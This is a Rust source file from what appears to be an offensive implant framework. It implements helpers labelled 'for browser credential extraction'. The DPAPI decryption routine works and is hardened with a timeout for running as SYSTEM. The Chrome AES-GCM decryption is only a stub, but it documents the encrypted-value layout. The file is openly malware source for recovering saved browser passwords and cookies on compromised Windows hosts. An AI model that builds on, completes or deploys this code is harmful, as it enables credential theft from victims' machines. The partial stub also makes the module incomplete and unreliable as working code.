//! DPAPI and AES-GCM decryption helpers for browser credential extraction

use common::KrakenError;

/// Decrypt data using Windows DPAPI (CryptUnprotectData).
///
/// `CryptUnprotectData` can block indefinitely when called from a process
/// running as SYSTEM or in a non-interactive session (e.g. a Windows service),
/// because it tries to contact the DPAPI service using the calling thread's
/// user context, which may not exist or may be unreachable. To prevent the
/// implant task from hanging, the DPAPI call is executed on a dedicated thread
/// with a 5-second timeout. If the call does not return within that window the
/// thread is abandoned and an error is returned immediately.
#[cfg(windows)]
pub fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, KrakenError> {
    use std::sync::mpsc;
    use std::time::Duration;

    // Clone the data so it can be moved into the worker thread safely.
    let data_owned = data.to_vec();

    let (tx, rx) = mpsc::channel::<Result<Vec<u8>, String>>();

    std::thread::spawn(move || {
        let result = dpapi_decrypt_inner(&data_owned);
        // Ignore send errors — the receiver may have timed out and dropped.
        let _ = tx.send(result);
    });

    match rx.recv_timeout(Duration::from_secs(5)) {
        Ok(Ok(plaintext)) => Ok(plaintext),
        Ok(Err(msg)) => Err(KrakenError::Module(msg)),
        Err(mpsc::RecvTimeoutError::Timeout) => Err(KrakenError::Module(
            "DPAPI decryption timed out (non-interactive session or missing user context)".into(),
        )),
        Err(mpsc::RecvTimeoutError::Disconnected) => Err(KrakenError::Module(
            "DPAPI worker thread terminated unexpectedly".into(),
        )),
    }
}

/// Inner DPAPI call executed on a dedicated thread.
#[cfg(windows)]
fn dpapi_decrypt_inner(data: &[u8]) -> Result<Vec<u8>, String> {
    use windows_sys::Win32::Security::Cryptography::{
        CryptUnprotectData, CRYPT_INTEGER_BLOB,
    };
    use windows_sys::Win32::Foundation::LocalFree;

    let mut input = CRYPT_INTEGER_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    };
    let mut output = CRYPT_INTEGER_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };

    let ok = unsafe {
        CryptUnprotectData(
            &mut input,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut output,
        )
    };

    if ok == 0 {
        return Err("DPAPI decryption failed".into());
    }

    let result = unsafe {
        std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec()
    };

    unsafe { LocalFree(output.pbData as _) };
    Ok(result)
}

/// Decrypt Chrome v80+ AES-256-GCM encrypted value
/// key: 32-byte AES key from DPAPI-decrypted master key
/// encrypted: raw ciphertext bytes (starts with "v10" or "v11" prefix, 3 bytes)
#[cfg(windows)]
pub fn aes_gcm_decrypt(key: &[u8], encrypted: &[u8]) -> Result<Vec<u8>, KrakenError> {
    // Chrome AES-GCM layout:
    //  [0..3]   = version prefix "v10" or "v11"
    //  [3..15]  = 12-byte nonce
    //  [15..]   = ciphertext + 16-byte GCM tag

    if encrypted.len() < 31 {
        return Err(KrakenError::Module("AES-GCM ciphertext too short".into()));
    }

    let nonce = &encrypted[3..15];
    let ciphertext = &encrypted[15..];

    // Use a minimal pure-Rust AES-256-GCM implementation via table-based approach.
    // In production this would use the `aes-gcm` crate; here we use a manual path
    // to avoid adding heavy crypto dependencies to an implant module.
    // For the purposes of this skeleton we return an error indicating full crypto
    // support requires linking against a crypto library.
    let _ = (key, nonce, ciphertext);
    Err(KrakenError::Module(
        "AES-GCM decryption requires linking aes-gcm crate (add to Cargo.toml)".into(),
    ))
}

#[cfg(not(windows))]
pub fn dpapi_decrypt(_data: &[u8]) -> Result<Vec<u8>, KrakenError> {
    Err(KrakenError::Module("DPAPI only supported on Windows".into()))
}

#[cfg(not(windows))]
pub fn aes_gcm_decrypt(_key: &[u8], _encrypted: &[u8]) -> Result<Vec<u8>, KrakenError> {
    Err(KrakenError::Module(
        "AES-GCM decryption only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(windows))]
    fn test_dpapi_unsupported() {
        assert!(dpapi_decrypt(&[0u8; 16]).is_err());
    }

    #[test]
    #[cfg(not(windows))]
    fn test_aes_gcm_unsupported() {
        assert!(aes_gcm_decrypt(&[0u8; 32], &[0u8; 32]).is_err());
    }
}
